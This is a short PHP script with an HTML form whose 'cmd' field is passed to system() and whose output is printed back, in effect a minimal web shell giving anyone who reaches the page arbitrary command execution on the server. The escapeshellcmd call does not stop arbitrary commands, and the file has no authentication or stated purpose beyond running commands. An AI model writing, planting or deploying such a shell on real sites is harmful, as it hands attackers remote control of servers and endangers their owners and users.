<?php
if ($_SERVER["REQUEST_METHOD"] === 'POST'){
	
	$CMD = escapeshellcmd($_POST["cmd"]);
	
	print_r($CMD);
	
	echo "<pre>";
	$comando = system($CMD, $return);
	echo "</pre>";
}
?>

<form method="POST">
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>
</form>